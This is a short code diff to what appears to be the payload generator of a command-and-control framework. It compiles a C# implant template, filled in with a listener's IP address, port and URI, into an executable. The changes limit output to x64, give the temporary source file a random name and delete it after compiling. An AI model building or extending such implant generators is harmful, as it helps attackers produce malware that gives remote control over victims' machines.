@@ -4,9 +4,12 @@ from common import *
 from listenershelpers import listeners, isValidListener, checkListenersEmpty
 
 import subprocess
+import random
+import string
+
 
 Payloads = {
-    "exe[x32/x64]" : "Coded in C#, compiled with Mono"
+    "exe[x64]" : "Coded in C#, compiled with Mono"
 }
 
 vPayloads = [payload for payload in Payloads]
@@ -50,7 +53,8 @@ def viewPayloads():
 def mono_msc(listener):
     
     temp_file = "./lib/templates/Implant.cs"
-    outpath   = "./lib/templates/temp.cs"
+    rnd_fname = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
+    outpath   = "./lib/templates/" + rnd_fname + ".cs"
     ip        = listeners[listener].ipaddress
     port      = listeners[listener].port
     uReg      = listeners[listener].uri_reg
@@ -72,6 +76,7 @@ def mono_msc(listener):
    
     out = subprocess.call(["mcs", outpath, "-r:System.Net.Http", "-sdk:4.8"])
     if out == 0:
+        subprocess.call(["rm", outpath])
         success("File generated in: {}".format(outpath.replace('.cs','.exe')))
    
     
